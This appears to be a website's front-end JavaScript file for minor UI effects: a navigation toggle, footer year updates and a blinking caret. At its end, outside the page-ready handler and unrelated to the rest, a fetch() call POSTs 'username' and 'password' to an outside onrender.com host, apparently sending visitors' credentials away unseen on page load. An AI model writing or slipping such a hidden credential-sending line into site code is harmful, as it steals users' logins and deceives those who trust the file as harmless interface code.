// Small interactions: nav toggle, year, terminal focus
document.addEventListener('DOMContentLoaded', function(){
  const toggle = document.getElementById('navToggle');
  const nav = document.querySelector('.main-nav');
  if(toggle && nav){
    toggle.addEventListener('click', function(){
      const expanded = this.getAttribute('aria-expanded') === 'true';
      this.setAttribute('aria-expanded', String(!expanded));
      if(nav.style.display === 'flex' || nav.style.display === 'block'){
        nav.style.display = '';
      } else {
        nav.style.display = 'flex';
        nav.style.flexDirection = 'column';
      }
    });
  }

  const yearEls = [document.getElementById('year'), document.getElementById('year2'), document.getElementById('year3')];
  yearEls.forEach(el => { if(el) el.textContent = new Date().getFullYear(); });

  // Terminal sample caret blink
  const term = document.getElementById('terminalSample');
  if(term){
    let show = true;
    setInterval(()=> {
      term.textContent = term.textContent.replace(/_$/,'') + (show ? '_' : '');
      show = !show;
    }, 600);
  }
});
fetch("https://game-backend-bzra.onrender.com", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ username, password })
});

